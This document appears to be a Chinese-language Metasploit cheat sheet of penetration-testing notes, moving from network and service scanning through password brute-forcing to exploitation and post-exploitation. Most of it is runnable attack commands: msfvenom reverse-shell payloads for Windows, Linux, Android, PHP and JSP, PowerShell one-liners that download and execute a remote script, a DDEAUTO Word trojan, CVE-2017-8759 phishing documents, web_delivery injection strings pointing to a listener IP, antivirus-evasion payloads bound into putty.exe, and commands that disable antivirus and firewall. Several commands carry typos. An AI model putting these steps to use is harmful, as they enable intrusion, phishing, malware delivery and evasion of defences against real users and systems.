# Metasploit

&nbsp;

## 信息收集模块

### 【whois查询】

* msf > whois example.com
* msf> whois 192.168.1.100

### 【ip信息收集工具】

* http://searchdns.netcraft.com/

### 【主机存活扫描】

* **存活扫描**
  ```bash
  msf> use auxiliary/scanner/discovery/arp_sweep
  set RHOSTS 192.168.1.0/24
  setTHREADS 50
  run
  ```
  >与nmap扫描相比nmap要更快，并且nmap不需要root权限


### 【端口扫描】

* **msf端口扫描**
  ```bash
  msf> use auxiliary/scanner/postscan/syn
  set RHOSTS 192.168.1.111
  set THREADS 50
  run
  ```
  
### 【特定扫描】

* **扫描mssql主机**
  ```bash
  msf> use auxiliary/scanner/mssql/mssql_ping
  show options
  set RHOSTS 192.168.1.0/24
  set THREADS 255
  run
  ```
  
* **SSH服务器扫描**
  ```bash
  msf> use auxiliary/scanner/ssh/ssh_version
  set RHOSTS 192.168.1.0/24
  setTHREADS 50
  run
  ```
  
* **Telnet服务器扫描**
  ```bash
  msf> use auxiliary/scanner/telnet/telnet_version
  set RHOSTS 192.168.1.0/24
  setTHREADS 50
  run
  ```
  
* **FTP主机扫描**
  ```bash
  msf> use auxiliary/scanner/ftp/ftp_version
  set RHOSTS 192.168.1.0/24
  setTHREADS 255
  run
  ```
  
* **FTP匿名扫描**
  ```bash
  msf> use auxiliary/scanner/ftp/anonymos
  set RHOSTS 192.168.1.0/24
  setTHREADS 50
  run
  ```
  
### 【网站目录扫描】

* **目录扫描**
  ```bash
  msf> use auxiliary/scanner/http/dir_scanner
  set RHOSTS 192.168.1.1
  setTHREADS 50
  run
  ```
  >目录扫描不完全，建议使用御剑

### 【扫描网站中的e-mail】

* **扫描email**
  ```bash
  msf> use auxiliary/gather/search_email_collector
  set DOMAIN cracer.com
  run
  ```
  
### 【嗅探抓包】

* **嗅探**
  ```bash
  msf> use auxiliary/sniffer/psnuffle
  run
  ```
  

&nbsp;


## 密码破解模块

### 【ssh服务口令猜测】

* **ssh服务口令猜测**
  ```bash
  msf> use auxiliary/scanner/ssh/ssh_login
  set RHOSTS 192.168.80.134
  set USERNAME root
  set PASS_FILE /root/pass.txt
  set THREADS 50
  run
  ```
  
### 【mysql口令攻击】

* **mysql口令攻击**
  ```bash
  msf> use auxiliary/scanner/mysql/mysql_login
  set RHOSTS 192.168.80.130
  set user_file /root/user.txt
  set pass_file /root/pass.txt
  exploit
  ```
  
  
### 【postgresql攻击】

* **postgresql攻击**
  ```bash
  msf> use auxiliary/scanner/postgres/postgres_login
  set RHOSTS 192.168.80.130
  set user_file /root/user.txt
  set pass_fiel /root/pass.txt
  exploit
  ```
  
### 【tomcat攻击】

* **tomcat攻击**
  ```bash
  msf> use auxiliary/scanner/http/tomcat_mgr_login
  set RHOSTS 192.168.1.1
  set PASS_FILE /root/pass.txt
  set USER_FILE /root/user.txt
  exploit
  ```
  
### 【telnet攻击】

* **telnet攻击**
  ```bash
  msf> use auxiliary/scanner/telnet/telnet_login
  set 192.168.1.1
  exploit
  ```
  
### 【samba攻击】

* **samba攻击**
  ```bash
  msf> use auxiliary/scanner/smb/smb_login
  set RHOSTS 192.168.1.1 /192.168.1.0/24
  set THREADS 200
  exploit
  ```
  

&nbsp;



## 漏洞利用模块

### 【metasploit常用命令】

* search <name>       用指定关键字搜索可利用漏洞
* use <exploit name>       使用漏洞
* show options            显示选项
* set <OPTION NAME> <option>              设置选项
* show payloads               显示装置
* show targets                显示目标(os版本)
* set TARGET <target number>               设置目标版本
* exploit                  开始漏洞攻击
* sessions -l                   列出会话
* sessions -i <ID>                   选择会话
* sessions -k <ID>                 结束会话
* <ctrl> z                      把会话放到后台
* <ctrl> c                   结束会话
* show auxiliary            显示辅助模块
* use <auxiliary name>             使用辅助模块
* set <OPTION NAME> <option>               设置选项

### 【metasploit各种payload】

* **使用msfvenom**
  * 查看该payload支持什么平台，有哪些选项
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp --list-options
    ```
    
  * 列出所有payload
    ```bash
    msfvenom --list payload
    ```
    
  * （列出所有编码器）shikata_ga_nai编码器使用的最多的一个
    ```bash
    msfvenom --list encoders
    ```
    
  * 一般使用tcp连接会背防火墙拦截，但是使用https或者http，cs协议防火墙一般不拦截reverse_tcp-------->reverse_http


* **handler后台持续监听**
  * -j为后台任务，-z为持续监听
    ```bash
    msf exploit（multi/handler）>exploit -j -z
    ```
    
  * 直接简历侦听，并且是后台运行
    ```bash
    msf >handler -H 1.1.1.1 -P 1102 -p windows/meterpreter/reverse_tcp
    ```
    
  * 使用msf >jobs -K结束所有任务

* **payload生成**
  * 反弹连接payload生成
    ```bash
    Linux系统：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -a x86 --platform Linux -f elf > shell.elf
    ```
    ```bash
    windows系统：msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f exe > shell.exe
    ```
    ```bash
    Mac系统：msfvenom -p osx/x86/shell_reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f macho > shell.macho
    ```
    ```bash
    Android系统：msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f raw > shell.apk
    ```
    ```bash
    PHP脚本：msfvenom -p php/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f raw > shell.php
    ```
    ```bash
    ASP脚本：msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f asp > shell.asp
    ```
    ```bash
    JSP脚本：msfvenom -p jsp_shell_reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f raw > shell.jsp
    ```
    ```bash
    WAR：msfvenom -p jsp_shell_reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f war > shell.war
    ```
    
  * 查看连接
    ```bash
    msf > sessions -l（会显示所有连接）
    ```
    
  * 切换连接
    ```bash
    msf > sessions -i 1（切换到1号连接）
    meterpreter > background（将1号连接挂在后台）
    meterpreter > exit（退出连接并关闭）
    ```
    
  >netstat -tnlp（查看本地端口连接）

### 【payload实战】

* **Powershell配合msf无文件攻击**
  * （1）生成ps脚本：
    ```bash
    msfvenom -p windows/x64/neterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1125 -f psh-reflection > x.ps1
    ```
    
  * （2）设置监听：
    ```bash
    msf > handler -H 1.1.1.1 -P 1125 -p windows/x64/metepreter/reverse_tcp
    ```
    
  * （3）将x.ps1文件放在一个网站根目录上
  * （4）客户端运行：
    ```bash
    powershell IEX(New-Object Net.WebClient).DownloadString('http://网站IP地址/x.ps1')
    ```
    
* **Powershell配合word伪装木马**
  * 前三个步骤与上一个实战相同
  * （4）新建word设置域：
    ```bash
    DDEAUTO C:\\windows\\system32\\cmd.exe" /k powershell IEX(New-Object Net.WebClient).DownloadString('http://网站IP地址/x.ps1')
    ```
  >一般拿到shell执行权限时会进行进程迁移，迁移到系统必定会打开不关闭的进程中，防止对方终止进程导致失去连接（meterpreter > migrate 进程号）

* **msf使用宏钓鱼**
  * （1）首先下载宏钓鱼工具（git clone https://github.com/bhdresh/CVE-2017-8759.git）
  * （2）创建rtf文件：
    ```bash
    python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://本地IP/logo.txt
    ```
  >生成一个rtf文件，此时这个文件还是正常的

    
  * （3）使用msf创建反弹payload：
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=本地IP地址 LPORT=本地要连接的端口 -f exe > shell.exe
    ```
  * （4）将反弹shell和rtf文件进行捆绑：
    ```bash
    python cve-2017-8759_toolkit.py -M exp -e http://本地IP/shell.exe -l /root/shell.exe
    ```
  >此时shell和rtf文件捆绑，脚本会在本地开启一个80端口

  * （5）开启监听，将钓鱼文件发送到目标，等待上线


* **msf使用web_delivery钓鱼**
  * （1）在msf中选择exploit/multi/script/web_delivery模块
  * （2）options查看模块参数
  * （3）输入payload（set payload php/meterpreter/reverse_tcp）选择payload要与整个模块选择的脚本语言对应，php对应php
  * （4）选择结果类型，如输出php，powershell脚本等（set target php）
  * （5）run运行
  >反弹脚本不同，功能也有差别，如php反弹脚本没有进程转移功能
  >web_delivery的利用方式有两种
  >命令注入：在注入点注入：  php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.20.163.160:1111/OgsOFaj3yKH'));"
  >远程文件包含：在包含漏洞处包含： http://172.20.163.160:1111/OgsOFaj3yKH




### 【免杀模块】

* **捆绑免杀**
  * 生成payload
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP LPORT=本地端口 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o payload.exe
    ```
    -e x86/shikata_ga_nai 参数为使用shikata编码免杀
    -x putty.exe 捆绑软件
    -i 15 进行15次编码
    -o payload.exe 输出捆绑好的软件
    
* **shellter免杀**
  * shellcode代码注入工具，网站：https://www.shellterproject.com/download


* **免杀msfpayload**
  * （1）生成py文件的shellcode：
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=本地IP LPORT=本地端口 -i 11 -f py -o msf.py
    ```
  
  * （2）使用python免杀模板，将msf.py中的shellcode复制进模板中
  * （3）对含有shellcode的模板进行编译，编译成exe文件：
    ```bash
    pyinstaller.py --console --onefile msf.py
    ```
    
  * （4）侦听端口


&nbsp;


## 后渗透模块

### 【meterpreter模块】

* **基本命令**
  * 进程迁移：meterpreter> migrate 迁移的进程ID（一般迁移到同等权限的进程）
  * 关闭杀软：C:\Users\lenovo> sc config "服务名称" start=disable （原理是关闭杀软的一个服务，使之不能正常工作，但是会丢失连接）
  * 通过shell关闭防火墙：C:\Users\lenovo> netsh adcfirewall set allprofiles state off
  * 查看目标机流量：meterpreter> run packettrecorder -i 1
  * 提取系统信息：meterpreter> run scraper
  * 查看进程：meterpreter> ps
  * 截屏：meterpreter> screenshot

* **操作命令**
  * 查看文件：meterpreter>cat c:\boot.ini
  * 删除文件：meterpreter>del c:\boot.ini
  * 上传文件：meterpreter>upload /root/desktop/test.exe c:\
  * 下载文件：meterpreter>download c:\\boot.ini /root/
  * 编辑文件：meterpreter>edit c:\boot.ini
  * 搜索文件：meterpreter>search -d c:\ -f *.doc（在c盘下搜索文件后缀为doc的文件）
  * 隐藏执行应用程序：meterpreter>execute -H -f notepad.exe（-H为隐藏后台，-f为要运行的程序）
  >可以将powershell命令写入.bat文件中，上传执行，避免指令过长导致无法执行的问题

* **端口转发**
  * 创建端口转发：meterpreter>portfwd add -l 1188 -r 192.168.1.102 -p 3389（add为增加一个端口转发，-l为监听的本地端口，-r为要连接的远程主机IP，-p为要连接的远程主机端口）
  * 连接本地端口，进行连接：meterpreter>rdesktop 127.0.0.1:1188
    
    
    